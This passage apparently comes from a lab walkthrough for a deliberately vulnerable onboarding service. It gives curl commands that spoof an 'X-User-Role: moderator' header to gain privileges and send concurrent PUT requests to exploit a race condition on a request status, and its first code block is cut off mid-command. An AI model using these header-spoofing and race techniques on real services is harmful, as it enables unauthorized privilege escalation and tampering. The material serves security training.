### 2 — Header spoof → F2

```bash
# Plain user is denied:

  -H 'Content-Type: application/json' -d '{"status":"approved"}' \
```

BFF rule: client `X-User-*` forwarded if present; else filled from JWT.

### 3 — Race recipe (gate for F3, optional if using 9303)

Seed **9302** starts `pending`. SoftDev sleeps ~40ms between read and write (`INTAKE_RACE_SLEEP_MS`).

```bash
# reset if needed (inside intake container):
# UPDATE onboarding_requests SET status='pending' WHERE id=9302;

curl -sS -X PUT -H "$AUTH" -H 'X-User-Role: moderator' \
  -H 'Content-Type: application/json' -d '{"status":"approved"}' \
  "$BASE/intake/onboarding-requests/9302/status" &
curl -sS -X PUT -H "$AUTH" -H 'X-User-Role: moderator' \
  -H 'Content-Type: application/json' -d '{"status":"rejected"}' \
  "$BASE/intake/onboarding-requests/9302/status" &
wait
# Last writer wins; ~50/50 approved vs rejected across runs.
```
